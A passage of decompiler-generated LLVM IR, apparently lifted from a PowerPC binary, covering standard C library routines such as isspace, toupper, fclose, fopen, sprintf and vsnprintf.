  store i32 %v0_1000b1f4, i32* %v2_1000b1f4, align 4
  br label %dec_label_pc_1000b1fc

dec_label_pc_1000b1fc:                            ; preds = %entry, %dec_label_pc_1000b1f0
  %v0_1000b20c = phi i32 [ %v0_1000b1e0, %entry ], [ -1, %dec_label_pc_1000b1f0 ]
  ret i32 %v0_1000b20c

; uselistorder directives
  uselistorder label %dec_label_pc_1000b1fc, { 1, 0 }
}

define i32 @isspace(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000b214 = mul i32 %arg1, 2
  %v3_1000b218 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -6736) to i32*), align 4
  %v2_1000b21c = add i32 %v3_1000b218, %v1_1000b214
  %v3_1000b21c = inttoptr i32 %v2_1000b21c to i16*
  %v4_1000b21c = load i16, i16* %v3_1000b21c, align 2
  %v5_1000b21c = zext i16 %v4_1000b21c to i32
  %v1_1000b220 = call i32 @__asm_rlwinm(i32 %v5_1000b21c, i32 0, i32 26, i32 26)
  ret i32 %v1_1000b220
}

define i32 @__GI_toupper(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1000b228 = add i32 %arg1, 128
  %v1_1000b22c = mul i32 %arg1, 2
  %v2_1000b230 = icmp ugt i32 %v1_1000b228, 383
  %v0_1000b234 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1000b230, i32 %v0_1000b234)
  %v3_1000b23c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -6728) to i32*), align 4
  %v2_1000b240 = add i32 %v1_1000b22c, %v3_1000b23c
  %v3_1000b240 = inttoptr i32 %v2_1000b240 to i16*
  %v4_1000b240 = load i16, i16* %v3_1000b240, align 2
  %v5_1000b240 = sext i16 %v4_1000b240 to i32
  ret i32 %v5_1000b240
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1002e648.826 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_1000b268 = add i32 %tmp, 52
  %v3_1000b268 = inttoptr i32 %v2_1000b268 to i32*
  %v4_1000b268 = load i32, i32* %v3_1000b268, align 4
  store i32 %v4_1000b268, i32* @r28, align 4
  %v3_1000b26c = icmp eq i32 %v4_1000b268, 0
  store i1 %v3_1000b26c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000b26c, label %dec_label_pc_1000b274, label %dec_label_pc_1000b294

dec_label_pc_1000b274:                            ; preds = %entry
  %v2_1000b27c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000b27c, i32* @r3, align 4
  %v0_1000b288 = call i32 @__pthread_return_void()
  %v0_1000b290 = call i32 @__pthread_return_0()
  %v0_1000b294.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b294

dec_label_pc_1000b294:                            ; preds = %entry, %dec_label_pc_1000b274
  %v0_1000b2a4 = phi i32 [ %tmp, %entry ], [ %v0_1000b294.pre, %dec_label_pc_1000b274 ]
  %v1_1000b294 = inttoptr i32 %v0_1000b2a4 to i16*
  %v2_1000b294 = load i16, i16* %v1_1000b294, align 2
  %v3_1000b294 = zext i16 %v2_1000b294 to i32
  store i32 0, i32* @r27, align 4
  %v1_1000b29c = and i32 %v3_1000b294, 64
  %v3_1000b29c = icmp eq i32 %v1_1000b29c, 0
  br i1 %v3_1000b29c, label %dec_label_pc_1000b2b0, label %dec_label_pc_1000b2a4

dec_label_pc_1000b2a4:                            ; preds = %dec_label_pc_1000b294
  store i32 268481196, i32* @lr, align 4
  %v4_1000b2a8 = call i32 @fflush_unlocked(i16* %v1_1000b294, i32 %v1_1000b29c)
  store i32 %v4_1000b2a8, i32* @r27, align 4
  %v0_1000b2b0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000b2b0

dec_label_pc_1000b2b0:                            ; preds = %dec_label_pc_1000b294, %dec_label_pc_1000b2a4
  %v0_1000b2b0 = phi i32 [ %v0_1000b2a4, %dec_label_pc_1000b294 ], [ %v0_1000b2b0.pre, %dec_label_pc_1000b2a4 ]
  %v1_1000b2b0 = add i32 %v0_1000b2b0, 4
  %v2_1000b2b0 = inttoptr i32 %v1_1000b2b0 to i32*
  %v3_1000b2b0 = load i32, i32* %v2_1000b2b0, align 4
  store i32 268481208, i32* @lr, align 4
  %v1_1000b2b4 = call i32 @__libc_close(i32 %v3_1000b2b0)
  %v3_1000b2b8 = icmp eq i32 %v1_1000b2b4, 0
  store i1 %v3_1000b2b8, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_1000b2b4, -1
  br i1 %tmp8, label %dec_label_pc_1000b2c4, label %dec_label_pc_1000b2c0

dec_label_pc_1000b2c0:                            ; preds = %dec_label_pc_1000b2b0
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000b2c4

dec_label_pc_1000b2c4:                            ; preds = %dec_label_pc_1000b2b0, %dec_label_pc_1000b2c0
  store i32 ptrtoint ([3 x i8]* @global_var_1000f670.827 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_1002e290.828 to i32), i32* @r29, align 4
  %v1_1000b2d8 = load i32, i32* @r31, align 4
  %v2_1000b2d8 = add i32 %v1_1000b2d8, 4
  %v3_1000b2d8 = inttoptr i32 %v2_1000b2d8 to i32*
  store i32 -1, i32* %v3_1000b2d8, align 4
  %v2_1000b2dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1000b2dc, i32* @r30, align 4
  store i32 %v2_1000b2dc, i32* @r3, align 4
  %v0_1000b2ec = call i32 @__pthread_return_void()
  %v0_1000b2f4 = call i32 @__pthread_return_0()
  %v3_1000b2fc = load i32, i32* @global_var_1002e620.829, align 4
  store i32 %v2_1000b2dc, i32* @r3, align 4
  %v1_1000b308 = add i32 %v3_1000b2fc, 1
  store i32 %v1_1000b308, i32* @global_var_1002e620.829, align 4
  %v0_1000b310 = call i32 @__pthread_return_void()
  %v0_1000b314 = load i32, i32* @r31, align 4
  %v1_1000b314 = inttoptr i32 %v0_1000b314 to i16*
  %v2_1000b314 = load i16, i16* %v1_1000b314, align 2
  %v3_1000b314 = zext i16 %v2_1000b314 to i32
  %v0_1000b318 = load i32, i32* @r28, align 4
  %v3_1000b318 = icmp eq i32 %v0_1000b318, 0
  store i1 %v3_1000b318, i1* %cr7_eq.global-to-local, align 1
  %v1_1000b31c = call i32 @__asm_rlwinm(i32 %v3_1000b314, i32 0, i32 17, i32 18)
  %v1_1000b324 = or i32 %v1_1000b31c, 48
  %v1_1000b328 = trunc i32 %v1_1000b324 to i16
  %v2_1000b328 = load i32, i32* @r31, align 4
  %v3_1000b328 = inttoptr i32 %v2_1000b328 to i16*
  store i16 %v1_1000b328, i16* %v3_1000b328, align 2
  %v0_1000b32c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000b32c, label %dec_label_pc_1000b330, label %dec_label_pc_1000b33c

dec_label_pc_1000b330:                            ; preds = %dec_label_pc_1000b2c4
  %v2_1000b330 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000b330, i32* @r3, align 4
  %v0_1000b338 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000b33c

dec_label_pc_1000b33c:                            ; preds = %dec_label_pc_1000b2c4, %dec_label_pc_1000b330
  %v0_1000b33c = load i32, i32* @r31, align 4
  %v1_1000b33c = inttoptr i32 %v0_1000b33c to i16*
  %v2_1000b33c = load i16, i16* %v1_1000b33c, align 2
  %v1_1000b340 = and i16 %v2_1000b33c, 16384
  %v3_1000b340 = icmp eq i16 %v1_1000b340, 0
  br i1 %v3_1000b340, label %dec_label_pc_1000b350, label %dec_label_pc_1000b348

dec_label_pc_1000b348:                            ; preds = %dec_label_pc_1000b33c
  %v1_1000b348 = add i32 %v0_1000b33c, 8
  %v2_1000b348 = inttoptr i32 %v1_1000b348 to i32*
  %v3_1000b348 = load i32, i32* %v2_1000b348, align 4
  store i32 %v3_1000b348, i32* @r3, align 4
  store i32 268481360, i32* @lr, align 4
  %v0_1000b34c = call i32 @free()
  br label %dec_label_pc_1000b350

dec_label_pc_1000b350:                            ; preds = %dec_label_pc_1000b33c, %dec_label_pc_1000b348
  store i32 %v2_1000b2dc, i32* @r3, align 4
  %v0_1000b35c = call i32 @__pthread_return_void()
  %v0_1000b364 = call i32 @__pthread_return_0()
  %v3_1000b36c = load i32, i32* @global_var_1002e624.830, align 4
  store i32 %v2_1000b2dc, i32* @r3, align 4
  %v1_1000b378 = add i32 %v3_1000b36c, 1
  store i32 %v1_1000b378, i32* @global_var_1002e624.830, align 4
  %v0_1000b380 = call i32 @__pthread_return_void()
  store i32 268481416, i32* @lr, align 4
  %v0_1000b384 = call i32 @_stdio_openlist_dec_use()
  %v0_1000b38c = load i32, i32* @r27, align 4
  ret i32 %v0_1000b38c

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000b350, { 1, 0 }
  uselistorder label %dec_label_pc_1000b33c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b2c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b2b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b294, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_1000b3a8 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_1000b3a8
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  store i32 %arg5, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  store i32 -1, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_1000b460 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000b460, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1000b4b0 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000b4b0, i32* %stack_var_-96, align 4
  store i32 268481724, i32* @lr, align 4
  %v0_1000b4b8 = call i32 @__GI_vsnprintf()
  ret i32 %v0_1000b4b8
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000b4d8 = load i32, i32* @r4, align 4
  store i32 %v0_1000b4d8, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_1000b4f4 = load i32, i32* @r3, align 4
  %v1_1000b4f4 = sub i32 -1, %v0_1000b4f4
  store i32 %v1_1000b4f4, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_1000b4f4, i32* %r31.global-to-local, align 4
  %v2_1000b508 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000b508, i32* @r3, align 4
  %v0_1000b50c = load i32, i32* @r5, align 4
  store i32 %v0_1000b50c, i32* %r29.global-to-local, align 4
  %v0_1000b510 = load i32, i32* @r6, align 4
  store i32 %v0_1000b510, i32* @r28, align 4
  store i32 268481824, i32* @lr, align 4
  %v0_1000b51c = call i32 @__stdio_init_mutex()
  %v0_1000b520 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000b520 = load i32, i32* @r27, align 4
  %v3_1000b520 = icmp ugt i32 %v0_1000b520, %v1_1000b520
  %v0_1000b524 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000b524, i32* @r4, align 4
  %v0_1000b528 = load i32, i32* @r28, align 4
  store i32 %v0_1000b528, i32* @r5, align 4
  %v2_1000b52c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1000b52c, i32* @r3, align 4
  br i1 %v3_1000b520, label %dec_label_pc_1000b538, label %dec_label_pc_1000b53c

dec_label_pc_1000b538:                            ; preds = %entry
  store i32 %v1_1000b520, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000b53c

dec_label_pc_1000b53c:                            ; preds = %entry, %dec_label_pc_1000b538
  %v1_1000b53c = phi i32 [ %v0_1000b520, %entry ], [ %v1_1000b520, %dec_label_pc_1000b538 ]
  %v0_1000b53c = load i32, i32* %r31.global-to-local, align 4
  store i32 268481884, i32* @lr, align 4
  %v0_1000b558 = call i32 @_vfprintf_internal()
  %v0_1000b55c = load i32, i32* @r30, align 4
  %v3_1000b55c = icmp eq i32 %v0_1000b55c, 0
  br i1 %v3_1000b55c, label %dec_label_pc_1000b584, label %dec_label_pc_1000b564

dec_label_pc_1000b564:                            ; preds = %dec_label_pc_1000b53c
  %v4_1000b570 = icmp eq i32 %v1_1000b53c, 0
  %v1_1000b56c = sext i1 %v4_1000b570 to i32
  %v0_1000b578.v0_1000b53c = add i32 %v0_1000b53c, %v1_1000b56c
  %stack_var_-88.0 = inttoptr i32 %v0_1000b578.v0_1000b53c to i8*
  %v0_1000b580 = load i32, i32* @r26, align 4
  %v1_1000b580 = trunc i32 %v0_1000b580 to i8
  store i8 %v1_1000b580, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_1000b584

dec_label_pc_1000b584:                            ; preds = %dec_label_pc_1000b53c, %dec_label_pc_1000b564
  ret i32 %v0_1000b558

; uselistorder directives
  uselistorder i32 %v0_1000b4f4, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_1000b584, { 1, 0 }
  uselistorder label %dec_label_pc_1000b53c, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000b598 = load i32, i32* @lr, align 4
  store i32 %v0_1000b598, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_1000b5ac = load i32, i32* @r5, align 4
  store i32 %v0_1000b5ac, i32* @r31, align 4
  %v0_1000b5b0 = load i32, i32* @r6, align 4
  store i32 %v0_1000b5b0, i32* @r29, align 4
  %v3_1000b5b4 = load i8, i8* %arg2, align 1
  %v4_1000b5b4 = zext i8 %v3_1000b5b4 to i32
  store i32 %v4_1000b5b4, i32* %r0.global-to-local, align 4
  %v3_1000b5b8 = icmp eq i8 %v3_1000b5b4, 114
  br i1 %v3_1000b5b8, label %dec_label_pc_1000b604, label %dec_label_pc_1000b5c0

dec_label_pc_1000b5c0:                            ; preds = %entry
  %v3_1000b5c0 = icmp eq i8 %v3_1000b5b4, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_1000b5c0, label %dec_label_pc_1000b608, label %dec_label_pc_1000b5cc

dec_label_pc_1000b5cc:                            ; preds = %dec_label_pc_1000b5c0
  %v3_1000b5cc = icmp eq i8 %v3_1000b5b4, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_1000b5cc, label %dec_label_pc_1000b608, label %dec_label_pc_1000b5d8

dec_label_pc_1000b5d8:                            ; preds = %dec_label_pc_1000b698, %dec_label_pc_1000b668, %dec_label_pc_1000b5cc
  %v0_1000b5d8 = call i32 @__errno_location()
  %v0_1000b5dc = load i32, i32* @r31, align 4
  %v3_1000b5dc = icmp eq i32 %v0_1000b5dc, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000b5e4 = inttoptr i32 %v0_1000b5d8 to i32*
  store i32 22, i32* %v2_1000b5e4, align 4
  br i1 %v3_1000b5dc, label %dec_label_pc_1000b838, label %dec_label_pc_1000b5ec

dec_label_pc_1000b5ec:                            ; preds = %dec_label_pc_1000b6cc, %dec_label_pc_1000b5d8
  %v0_1000b5ec = load i32, i32* @r31, align 4
  %v1_1000b5ec = inttoptr i32 %v0_1000b5ec to i16*
  %v2_1000b5ec = load i16, i16* %v1_1000b5ec, align 2
  %v3_1000b5ec = zext i16 %v2_1000b5ec to i32
  store i32 %v3_1000b5ec, i32* %r0.global-to-local, align 4
  %v1_1000b5f0 = and i32 %v3_1000b5ec, 8192
  store i32 %v1_1000b5f0, i32* %r9.global-to-local, align 4
  %v3_1000b5f0 = icmp eq i32 %v1_1000b5f0, 0
  store i1 %v3_1000b5f0, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000b5f0, label %dec_label_pc_1000b838, label %dec_label_pc_1000b5f8

dec_label_pc_1000b5f8:                            ; preds = %dec_label_pc_1000b5ec
  store i32 %v0_1000b5ec, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000b600.832 to i32), i32* @lr, align 4
  %v0_1000b5fc = call i32 @free()
  br label %dec_label_pc_1000b838

dec_label_pc_1000b604:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000b608

dec_label_pc_1000b608:                            ; preds = %dec_label_pc_1000b5cc, %dec_label_pc_1000b5c0, %dec_label_pc_1000b604
  %v0_1000b628 = phi i32 [ 1089, %dec_label_pc_1000b5cc ], [ 577, %dec_label_pc_1000b5c0 ], [ 1, %dec_label_pc_1000b604 ]
  %v2_1000b608 = add i32 %tmp, 1
  %v3_1000b608 = inttoptr i32 %v2_1000b608 to i8*
  %v4_1000b608 = load i8, i8* %v3_1000b608, align 1
  %v5_1000b608 = zext i8 %v4_1000b608 to i32
  store i32 %v5_1000b608, i32* %r0.global-to-local, align 4
  %v3_1000b610 = icmp eq i8 %v4_1000b608, 98
  br i1 %v3_1000b610, label %dec_label_pc_1000b61c, label %dec_label_pc_1000b618

dec_label_pc_1000b618:                            ; preds = %dec_label_pc_1000b608
  br label %dec_label_pc_1000b61c

dec_label_pc_1000b61c:                            ; preds = %dec_label_pc_1000b608, %dec_label_pc_1000b618
  %storemerge = phi i32 [ %tmp, %dec_label_pc_1000b618 ], [ %v2_1000b608, %dec_label_pc_1000b608 ]
  %v0_1000b61c = phi i32 [ %tmp, %dec_label_pc_1000b618 ], [ %v2_1000b608, %dec_label_pc_1000b608 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000b61c = add i32 %v0_1000b61c, 1
  %v2_1000b61c = inttoptr i32 %v1_1000b61c to i8*
  %v3_1000b61c = load i8, i8* %v2_1000b61c, align 1
  %v4_1000b61c = zext i8 %v3_1000b61c to i32
  store i32 %v4_1000b61c, i32* %r0.global-to-local, align 4
  %v3_1000b620 = icmp eq i8 %v3_1000b61c, 43
  br i1 %v3_1000b620, label %dec_label_pc_1000b628, label %dec_label_pc_1000b630

dec_label_pc_1000b628:                            ; preds = %dec_label_pc_1000b61c
  store i32 %v0_1000b628, i32* %r9.global-to-local, align 4
  %v1_1000b62c = add nuw nsw i32 %v0_1000b628, 1
  store i32 %v1_1000b62c, i32* @r28, align 4
  br label %dec_label_pc_1000b630

dec_label_pc_1000b630:                            ; preds = %dec_label_pc_1000b61c, %dec_label_pc_1000b628
  %v3_1000b630 = icmp eq i32 %v0_1000b5ac, 0
  br i1 %v3_1000b630, label %dec_label_pc_1000b638, label %dec_label_pc_1000b660

dec_label_pc_1000b638:                            ; preds = %dec_label_pc_1000b630
  store i32 80, i32* @r3, align 4
  store i32 268482112, i32* @lr, align 4
  %v0_1000b63c = call i32 @malloc()
  store i32 %v0_1000b63c, i32* @r31, align 4
  %v4_1000b640 = icmp eq i32 %v0_1000b63c, 0
  store i1 %v4_1000b640, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_1000b640, label %dec_label_pc_1000b83c, label %dec_label_pc_1000b648

dec_label_pc_1000b648:                            ; preds = %dec_label_pc_1000b638
  %v1_1000b64c = add i32 %v0_1000b63c, 56
  store i32 %v1_1000b64c, i32* @r3, align 4
  %v3_1000b650 = inttoptr i32 %v0_1000b63c to i16*
  store i16 8192, i16* %v3_1000b650, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000b658 = load i32, i32* @r31, align 4
  %v2_1000b658 = add i32 %v1_1000b658, 8
  %v3_1000b658 = inttoptr i32 %v2_1000b658 to i32*
  store i32 0, i32* %v3_1000b658, align 4
  store i32 268482144, i32* @lr, align 4
  %v0_1000b65c = call i32 @__stdio_init_mutex()
  %v0_1000b660.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000b660

dec_label_pc_1000b660:                            ; preds = %dec_label_pc_1000b630, %dec_label_pc_1000b648
  %v0_1000b6c0 = phi i32 [ %v0_1000b5b0, %dec_label_pc_1000b630 ], [ %v0_1000b660.pre, %dec_label_pc_1000b648 ]
  %v1_1000b660 = icmp slt i32 %v0_1000b6c0, 0
  br i1 %v1_1000b660, label %dec_label_pc_1000b6c0, label %dec_label_pc_1000b668

dec_label_pc_1000b668:                            ; preds = %dec_label_pc_1000b660
  %v1_1000b66c = add i32 %arg1, 1
  store i32 %v1_1000b66c, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_1000b674 = load i32, i32* @r31, align 4
  %v2_1000b674 = add i32 %v1_1000b674, 4
  %v3_1000b674 = inttoptr i32 %v2_1000b674 to i32*
  store i32 %v0_1000b6c0, i32* %v3_1000b674, align 4
  %v0_1000b678 = load i32, i32* @r28, align 4
  %v1_1000b678 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b678 = and i32 %v1_1000b678, %v0_1000b678
  %v1_1000b67c = add i32 %v2_1000b678, 1
  store i32 %v1_1000b67c, i32* %r9.global-to-local, align 4
  %v1_1000b680 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000b680 = and i32 %v1_1000b680, %v1_1000b67c
  store i32 %v2_1000b680, i32* %r0.global-to-local, align 4
  %v4_1000b684 = icmp eq i32 %v2_1000b680, %v1_1000b67c
  br i1 %v4_1000b684, label %dec_label_pc_1000b68c, label %dec_label_pc_1000b5d8

dec_label_pc_1000b68c:                            ; preds = %dec_label_pc_1000b668
  %v2_1000b68c = sub i32 -1, %arg1
  %v3_1000b68c = and i32 %v0_1000b678, %v2_1000b68c
  store i32 %v3_1000b68c, i32* %r0.global-to-local, align 4
  %v1_1000b690 = and i32 %v3_1000b68c, 1024
  store i32 %v1_1000b690, i32* %r9.global-to-local, align 4
  %v3_1000b690 = icmp eq i32 %v1_1000b690, 0
  store i1 %v3_1000b690, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000b690, label %dec_label_pc_1000b6b4, label %dec_label_pc_1000b698

dec_label_pc_1000b698:                            ; preds = %dec_label_pc_1000b68c
  %v0_1000b698 = load i32, i32* @r29, align 4
  store i32 268482220, i32* @lr, align 4
  %v2_1000b6a8 = call i32 @__libc_fcntl(i32 %v0_1000b698, i32 4)
  %v3_1000b6ac = icmp eq i32 %v2_1000b6a8, 0
  br i1 %v3_1000b6ac, label %dec_label_pc_1000b6b4, label %dec_label_pc_1000b5d8

dec_label_pc_1000b6b4:                            ; preds = %dec_label_pc_1000b698, %dec_label_pc_1000b68c
  %v1_1000b6b4 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_1000b6b4, i32* %r0.global-to-local, align 4
  %v0_1000b6b8 = load i32, i32* @r28, align 4
  %v2_1000b6b8 = or i32 %v0_1000b6b8, %v1_1000b6b4
  store i32 %v2_1000b6b8, i32* @r28, align 4
  br label %dec_label_pc_1000b6ec

dec_label_pc_1000b6c0:                            ; preds = %dec_label_pc_1000b660
  %v3_1000b6c0 = icmp eq i32 %v0_1000b6c0, -1
  %v0_1000b6d0.pre = load i32, i32* @r28, align 4
  br i1 %v3_1000b6c0, label %dec_label_pc_1000b6cc, label %dec_label_pc_1000b6c8

dec_label_pc_1000b6c8:                            ; preds = %dec_label_pc_1000b6c0
  %v1_1000b6c8 = or i32 %v0_1000b6d0.pre, 65536
  store i32 %v1_1000b6c8, i32* @r28, align 4
  br label %dec_label_pc_1000b6cc

dec_label_pc_1000b6cc:                            ; preds = %dec_label_pc_1000b6c0, %dec_label_pc_1000b6c8
  %v0_1000b6d0 = phi i32 [ %v1_1000b6c8, %dec_label_pc_1000b6c8 ], [ %v0_1000b6d0.pre, %dec_label_pc_1000b6c0 ]
  store i32 438, i32* @r5, align 4
  store i32 268482272, i32* @lr, align 4
  %v2_1000b6dc = call i32 @__libc_open(i32 %arg1, i32 %v0_1000b6d0)
  %v1_1000b6e0 = icmp slt i32 %v2_1000b6dc, 0
  %v1_1000b6e4 = load i32, i32* @r31, align 4
  %v2_1000b6e4 = add i32 %v1_1000b6e4, 4
  %v3_1000b6e4 = inttoptr i32 %v2_1000b6e4 to i32*
  store i32 %v2_1000b6dc, i32* %v3_1000b6e4, align 4
  br i1 %v1_1000b6e0, label %dec_label_pc_1000b5ec, label %dec_label_pc_1000b6cc.dec_label_pc_1000b6ec_crit_edge

dec_label_pc_1000b6cc.dec_label_pc_1000b6ec_crit_edge: ; preds = %dec_label_pc_1000b6cc
  %v0_1000b6f0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000b6ec

dec_label_pc_1000b6ec:                            ; preds = %dec_label_pc_1000b6cc.dec_label_pc_1000b6ec_crit_edge, %dec_label_pc_1000b6b4
  %v0_1000b6f0 = phi i32 [ %v0_1000b6f0.pre, %dec_label_pc_1000b6cc.dec_label_pc_1000b6ec_crit_edge ], [ %v2_1000b6b8, %dec_label_pc_1000b6b4 ]
  %v0_1000b6ec = load i32, i32* @r31, align 4
  %v1_1000b6ec = inttoptr i32 %v0_1000b6ec to i16*
  %v2_1000b6ec = load i16, i16* %v1_1000b6ec, align 2
  %v3_1000b6ec = zext i16 %v2_1000b6ec to i32
  store i32 %v3_1000b6ec, i32* %r0.global-to-local, align 4
  %v1_1000b6f0 = urem i32 %v0_1000b6f0, 4
  store i32 %v1_1000b6f0, i32* %r29.global-to-local, align 4
  %v1_1000b6f4 = call i32 @__asm_rlwinm(i32 %v0_1000b6f0, i32 0, i32 21, i32 21)
  %v1_1000b6f8 = add nuw nsw i32 %v1_1000b6f0, 1
  store i32 %v1_1000b6f8, i32* %r29.global-to-local, align 4
  %v1_1000b6fc = call i32 @__asm_rlwinm(i32 %v3_1000b6ec, i32 0, i32 18, i32 18)
  store i32 %v1_1000b6fc, i32* %r0.global-to-local, align 4
  %v1_1000b700 = xor i32 %v1_1000b6f8, 3
  store i32 %v1_1000b700, i32* %r29.global-to-local, align 4
  %v1_1000b704 = urem i32 %v1_1000b6fc, 65536
  store i32 %v1_1000b704, i32* %r9.global-to-local, align 4
  %v0_1000b708 = load i32, i32* @r28, align 4
  %v1_1000b708 = call i32 @__asm_rlwinm(i32 %v0_1000b708, i32 31, i32 16, i32 16)
  %v2_1000b70c = or i32 %v1_1000b708, %v1_1000b6f4
  store i32 %v2_1000b70c, i32* %r0.global-to-local, align 4
  %v0_1000b710 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000b710 = mul i32 %v0_1000b710, 16
  %v0_1000b714 = load i32, i32* %r9.global-to-local, align 4
  %v2_1000b714 = or i32 %v0_1000b714, %v2_1000b70c
  store i32 %v2_1000b714, i32* %r9.global-to-local, align 4
  %v2_1000b718 = or i32 %v2_1000b714, %v1_1000b710
  store i32 %v2_1000b718, i32* @r29, align 4
  %v1_1000b71c = trunc i32 %v2_1000b718 to i16
  %v2_1000b71c = load i32, i32* @r31, align 4
  %v3_1000b71c = inttoptr i32 %v2_1000b71c to i16*
  store i16 %v1_1000b71c, i16* %v3_1000b71c, align 2
  %v0_1000b720 = call i32 @__errno_location()
  store i32 %v0_1000b720, i32* @r28, align 4
  %v0_1000b728 = load i32, i32* @r31, align 4
  %v1_1000b728 = add i32 %v0_1000b728, 4
  %v2_1000b728 = inttoptr i32 %v1_1000b728 to i32*
  %v3_1000b728 = load i32, i32* %v2_1000b728, align 4
  %v1_1000b72c = inttoptr i32 %v0_1000b720 to i32*
  %v2_1000b72c = load i32, i32* %v1_1000b72c, align 4
  store i32 %v2_1000b72c, i32* @r27, align 4
  store i32 268482356, i32* @lr, align 4
  %v1_1000b730 = call i32 @isatty(i32 %v3_1000b728)
  %v1_1000b734 = mul i32 %v1_1000b730, 256
  %v0_1000b738 = load i32, i32* @r29, align 4
  %v2_1000b738 = or i32 %v0_1000b738, %v1_1000b734
  store i32 %v2_1000b738, i32* @r29, align 4
  %v1_1000b73c = trunc i32 %v2_1000b738 to i16
  %v2_1000b73c = load i32, i32* @r31, align 4
  %v3_1000b73c = inttoptr i32 %v2_1000b73c to i16*
  store i16 %v1_1000b73c, i16* %v3_1000b73c, align 2
  %v0_1000b740 = load i32, i32* @r27, align 4
  %v1_1000b740 = load i32, i32* @r28, align 4
  %v2_1000b740 = inttoptr i32 %v1_1000b740 to i32*
  store i32 %v0_1000b740, i32* %v2_1000b740, align 4
  %v0_1000b744 = load i32, i32* @r31, align 4
  %v1_1000b744 = add i32 %v0_1000b744, 8
  %v2_1000b744 = inttoptr i32 %v1_1000b744 to i32*
  %v3_1000b744 = load i32, i32* %v2_1000b744, align 4
  store i32 %v3_1000b744, i32* %r0.global-to-local, align 4
  %v3_1000b748 = icmp eq i32 %v3_1000b744, 0
